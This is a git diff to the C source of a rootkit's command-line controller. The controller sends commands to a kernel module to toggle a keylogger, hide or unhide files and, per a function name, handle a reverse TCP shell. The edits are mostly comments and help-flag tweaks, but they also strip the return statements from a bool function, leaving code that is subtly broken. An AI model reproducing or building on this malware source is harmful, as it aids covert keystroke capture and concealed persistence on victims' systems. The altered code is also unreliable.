@@ -121,6 +121,10 @@ void handle_reverse_tcp_shell(char *base_cmd, action_task *action) {
  * Populates action_task* action which is ready to be communicated to kernel if
  * keylogger action is commanded by user. Returns true if keylogger action
  * detected, otherwise, returns false.
+ *
+ * Handles:
+ * 	$ keylogger enable
+ * 	$ keylogger disable
  */
 bool handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) {
 	if (! strcmp(base_cmd, KEYLOGGER)) {
@@ -128,15 +132,16 @@ bool handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) 
 			action->func_code = f_code.keylogger_enable;
 		} else if (! strcmp(subarg, DISABLE)) { // Keylogger disable
 			action->func_code = f_code.keylogger_disable;
-		} else { // Invalid keylogger option
-			return false;
 		}
-		return true;
-	} else {
-		return false;
 	}
 }
 
+/**
+ * Handles three commands:
+ * 	$ hide show
+ * 	$ hide add FILE
+ * 	$ hide rm FILE
+ */
 void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_task *action) {
 	if (! strcmp(base_cmd, FILE_HIDE)) {
 		if (! strcmp(subarg, SHOW)) {
@@ -168,17 +173,20 @@ bool execute_action_if_possible(action_task *action) {
 }
 
 /**
- * CLI for interacting with the rootkit, and interfacing with the kernel module.
+ * CLI for interacting with the rootkit and interfacing with the kernel module.
  */
 int main(int argc, char *argv[]) {
+	print_banner();
+
 	// No args entered. Display help menu.
-	if (argc == 1 || ! strcmp(argv[1], "-h")) {
+	if (argc == 1 || ! strcmp(argv[1], "-h") || ! strcmp(argv[1], "--help")) {
 		print_usage();
 		return 0;
 	}
 
-	print_banner();
-
+	// Set up action_task. This is what will be passed to the LKM to make
+	// things happen. Set the func_code to -1 initially so we can detect failure
+	// to set any options later.
 	action_task action;
 	memset(&action, 0, sizeof(action));
 	action.func_code = - 1;
@@ -193,9 +201,12 @@ int main(int argc, char *argv[]) {
 	check_for_subarg(2, argv);
 	char *subarg = argv[2];
 	handle_keylogger_action(base_cmd, subarg, &action);
+
+	// Parse triple arg commands
 	handle_file_hide_action(base_cmd, subarg, argv, &action);
 	execute_action_if_possible(&action);
 
+	// If we get here, no valid command has been entered.
 	print_usage();
 	return 0;
 }
